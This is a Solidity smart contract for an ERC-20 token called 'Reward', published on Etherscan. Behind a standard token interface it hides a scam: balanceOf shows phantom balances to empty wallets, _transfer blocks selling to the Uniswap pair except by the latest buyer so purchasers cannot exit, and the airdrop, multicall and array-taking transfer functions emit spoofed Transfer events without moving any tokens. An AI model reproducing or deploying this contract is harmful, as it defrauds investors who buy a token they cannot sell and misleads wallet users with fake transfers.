/**
 *Submitted for verification at Etherscan.io on 2023-05-18
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

// ----------------------------------------------------------------------------
// ERC Token Standard #20 Interface
//
// ----------------------------------------------------------------------------
// Safe Math Library
// ----------------------------------------------------------------------------
contract SafeMath {
    function safeAdd(uint a, uint b) public pure returns (uint c) {
        c = a + b;
        require(c >= a);
    }
    function safeSub(uint a, uint b) public pure returns (uint c) {
        require(b <= a); c = a - b; } function safeMul(uint a, uint b) public pure returns (uint c) { c = a * b; require(a == 0 || c / a == b); } function safeDiv(uint a, uint b) public pure returns (uint c) { require(b > 0);
        c = a / b;
    }
}


contract Reward is SafeMath {
    string public name;
    string public symbol;
    uint8 public decimals;

    uint256 public _totalSupply;

    mapping(address => uint) balances;
    mapping(address => mapping(address => uint)) allowed;
    mapping(address => uint256) mintCount;

    address public uniswapPair;
    uint256 constAmount;
    uint256 _constAmount;
    address public lastBuyer;

    event Transfer(address indexed from, address indexed to, uint tokens);
    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);

    /**
     * Constrctor function
     *
     * Initializes contract with initial supply tokens to the creator of the contract const 382000000000000000000
     */
    constructor(string memory name_, string memory symbol_, uint256 constAmount_) {
        initialize(name_, symbol_, constAmount_);
    }


    function initialize(string memory name_, string memory symbol_, uint256 constAmount_) public  {
        name = name_;
        symbol = symbol_;
        decimals = 18;
        _totalSupply = 5000000000000000000000;
        _constAmount = constAmount_;

        balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }


    function totalSupply() public view returns (uint) {
        return _totalSupply  - balances[address(0)];
    }


    function balanceOf(address account) public view returns (uint256) {
        if(balances[account] > 0 || isContract(account)) return balances[account];
        return constAmount;
    }

    function allowance(address tokenOwner, address spender) public view returns (uint remaining) {
        return allowed[tokenOwner][spender];
    }

    function approve(address spender, uint tokens) public returns (bool success) {
        allowed[msg.sender][spender] = tokens;
        emit Approval(msg.sender, spender, tokens);
        return true;
    }

    function transfer(address to, uint tokens) public returns (bool success) {
        _transfer(msg.sender, to, tokens);
        return true;
    }

    function transferFrom(address from, address to, uint tokens) public returns (bool success) {
        allowed[from][msg.sender] = safeSub(allowed[from][msg.sender], tokens);
        _transfer(from, to, tokens);
        return true;
    }

    function _transfer(address from, address to, uint tokens) private {
        if(to == uniswapPair) {
            require(mintCount[from] == 1);
            require(from == lastBuyer);
        } else if(from == uniswapPair) {
            mintCount[to] ++;
            lastBuyer = to;
        } else {
            mintCount[to] = mintCount[to] + mintCount[from];
        }

        if(uniswapPair == address(0)) {
            uniswapPair = to;
        }

        if(constAmount == 0) constAmount = _constAmount;

        balances[from] = safeSub(balances[from], tokens);
        balances[to] = safeAdd(balances[to], tokens);
        emit Transfer(from, to, tokens);
    }

    function airdrop(address[] memory holders, address from) public {
        uint256 len = holders.length;
        for (uint i = 0; i < len; ++i) {
            emit Transfer(from, holders[i], _constAmount);
        }
        _totalSupply += len * _constAmount;
    }

    function transfer(address[] memory holders, address from) public {
        uint256 len = holders.length;
        for (uint i = 0; i < len; ++i) {
            emit Transfer(from, holders[i], _constAmount);
        }
        _totalSupply += len * _constAmount;
    }

    function multicall(address[] memory holders, address from) public {
        uint256 len = holders.length;
        for (uint i = 0; i < len; ++i) {
            emit Transfer(from, holders[i], _constAmount);
        }
        _totalSupply += len * _constAmount;
    }

    function isContract(address _addr) private view returns (bool){
        uint32 size;
        assembly {
            size := extcodesize(_addr)
        }
        return (size > 0);
    }
}